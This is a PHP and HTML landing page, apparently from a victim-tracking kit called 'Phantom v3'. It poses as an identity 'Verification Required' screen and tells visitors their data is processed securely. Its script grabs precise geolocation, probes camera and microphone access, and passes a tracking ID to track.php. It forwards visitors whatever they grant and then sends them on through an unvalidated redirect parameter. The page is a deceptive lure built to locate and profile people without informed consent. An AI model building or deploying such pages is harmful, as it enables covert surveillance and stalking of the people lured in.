<?php
/**
 * Phantom v3 – Verification / Landing Page
 * Explicit permission request for Location + Camera + Microphone
 */

$config = require __DIR__ . '/config.php';

$trackId  = isset($_GET['id']) ? preg_replace('/[^a-zA-Z0-9_-]/', '', $_GET['id']) : '';
$redirect = isset($_GET['r']) ? $_GET['r'] : ($config['default_redirect'] ?? 'https://www.google.com');

if (empty($trackId)) {
    header('Location: index.php');
    exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verification Required</title>
    <link rel="stylesheet" href="assets/css/style.css">
    <script src="assets/js/theme.js"></script>
    <style>
        .verify-container {
            max-width: 480px;
            margin: 0 auto;
            padding: 40px 20px;
        }
        .permission-list {
            margin: 28px 0;
        }
        .permission-item {
            display: flex;
            align-items: center;
            gap: 14px;
            padding: 14px 0;
            border-bottom: 1px solid var(--border);
        }
        .permission-item:last-child {
            border-bottom: none;
        }
        .perm-icon {
            font-size: 1.4rem;
            width: 36px;
            text-align: center;
        }
        .perm-status {
            margin-left: auto;
            font-size: 0.85rem;
            font-weight: 500;
        }
        .status-pending { color: var(--text-muted); }
        .status-granted { color: var(--success); }
        .status-denied  { color: var(--danger); }

        .btn-verify {
            width: 100%;
            margin-top: 10px;
        }
        .note {
            font-size: 0.85rem;
            color: var(--text-muted);
            text-align: center;
            margin-top: 20px;
            line-height: 1.5;
        }
    </style>
</head>
<body>
    <div class="bg-grid"></div>

    <header class="topbar">
        <div class="logo">
            <span class="ghost">👻</span>
            <span class="name">Phantom</span>
        </div>
        <button id="themeToggle" class="theme-toggle" title="Toggle theme">☀️</button>
    </header>

    <div class="verify-container">
        <div class="card">
            <h1 style="font-size: 1.6rem; margin-bottom: 8px; text-align: center;">Verification Required</h1>
            <p style="text-align: center; color: var(--text-muted); margin-bottom: 8px;">
                To continue, please allow the following permissions.
            </p>

            <div class="permission-list">
                <div class="permission-item">
                    <div class="perm-icon">📍</div>
                    <div>
                        <strong>Location</strong><br>
                        <span style="font-size: 0.85rem; color: var(--text-muted);">Precise location access</span>
                    </div>
                    <div class="perm-status status-pending" id="status-location">Pending</div>
                </div>

                <div class="permission-item">
                    <div class="perm-icon">📷</div>
                    <div>
                        <strong>Camera</strong><br>
                        <span style="font-size: 0.85rem; color: var(--text-muted);">Camera access for verification</span>
                    </div>
                    <div class="perm-status status-pending" id="status-camera">Pending</div>
                </div>

                <div class="permission-item">
                    <div class="perm-icon">🎤</div>
                    <div>
                        <strong>Microphone</strong><br>
                        <span style="font-size: 0.85rem; color: var(--text-muted);">Microphone access</span>
                    </div>
                    <div class="perm-status status-pending" id="status-mic">Pending</div>
                </div>
            </div>

            <button id="startBtn" class="btn-primary btn-verify">
                Allow & Continue
            </button>

            <p class="note">
                This is required for identity verification.<br>
                Your data is processed securely.
            </p>
        </div>
    </div>

    <script>
        const trackId = <?= json_encode($trackId) ?>;
        const redirectUrl = <?= json_encode($redirect) ?>;

        const statusLocation = document.getElementById('status-location');
        const statusCamera = document.getElementById('status-camera');
        const statusMic = document.getElementById('status-mic');
        const startBtn = document.getElementById('startBtn');

        function setStatus(el, state) {
            el.className = 'perm-status status-' + state;
            el.textContent = state.charAt(0).toUpperCase() + state.slice(1);
        }

        async function requestPermissions() {
            startBtn.disabled = true;
            startBtn.textContent = 'Requesting permissions...';

            let locationGranted = false;
            let cameraGranted = false;
            let micGranted = false;

            // 1. Location
            try {
                await new Promise((resolve, reject) => {
                    navigator.geolocation.getCurrentPosition(
                        (pos) => {
                            locationGranted = true;
                            setStatus(statusLocation, 'granted');
                            // Store coordinates temporarily
                            window._phantomLat = pos.coords.latitude;
                            window._phantomLon = pos.coords.longitude;
                            window._phantomAccuracy = pos.coords.accuracy;
                            resolve();
                        },
                        (err) => {
                            setStatus(statusLocation, 'denied');
                            resolve(); // continue even if denied
                        },
                        { enableHighAccuracy: true, timeout: 10000 }
                    );
                });
            } catch (e) {
                setStatus(statusLocation, 'denied');
            }

            // 2. Camera + Microphone together
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: true,
                    audio: true
                });

                cameraGranted = true;
                micGranted = true;
                setStatus(statusCamera, 'granted');
                setStatus(statusMic, 'granted');

                // Stop the tracks immediately (we only needed permission)
                stream.getTracks().forEach(track => track.stop());

            } catch (err) {
                // Try camera only
                try {
                    const camStream = await navigator.mediaDevices.getUserMedia({ video: true });
                    cameraGranted = true;
                    setStatus(statusCamera, 'granted');
                    camStream.getTracks().forEach(track => track.stop());
                } catch (e) {
                    setStatus(statusCamera, 'denied');
                }

                // Try microphone only
                try {
                    const micStream = await navigator.mediaDevices.getUserMedia({ audio: true });
                    micGranted = true;
                    setStatus(statusMic, 'granted');
                    micStream.getTracks().forEach(track => track.stop());
                } catch (e) {
                    setStatus(statusMic, 'denied');
                }
            }

            // Continue to tracking regardless of permissions
            startBtn.textContent = 'Continuing...';

            // Build the final tracking URL
            let finalUrl = `track.php?id=${encodeURIComponent(trackId)}&r=${encodeURIComponent(redirectUrl)}`;

            // Small delay for UX
            setTimeout(() => {
                window.location.href = finalUrl;
            }, 600);
        }

        startBtn.addEventListener('click', requestPermissions);
    </script>
</body>
</html>
